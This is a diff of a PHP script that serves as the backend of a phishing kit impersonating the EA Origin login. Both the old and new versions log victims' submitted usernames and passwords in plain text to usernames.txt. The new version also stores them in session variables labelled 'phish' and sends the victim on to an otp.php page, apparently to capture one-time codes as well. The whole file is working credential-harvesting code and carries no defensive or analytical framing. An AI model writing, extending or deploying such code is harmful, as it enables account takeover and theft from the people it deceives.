@@ -1,5 +1,12 @@
 <?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://signin.ea.com/p/originX/login?execution=e1749410853s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fresponse_type%3Dcode%26client_id%3DORIGIN_SPA_ID%26display%3DoriginXWeb%252Flogin%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html');
+session_start();
+$u = $_POST['username'] ?? '';
+$p = $_POST['password'] ?? '';
+$_SESSION['phish_user'] = $u;
+$_SESSION['phish_pass'] = $p;
+$_SESSION['phish_redirect'] = 'https://www.origin.com';
+$_SESSION['phish_brand'] = 'EA Origin';
+file_put_contents("usernames.txt", "Account: " . $u . " Pass: " . $p . "\n", FILE_APPEND);
+header('Location: otp.php');
 exit();
+?>
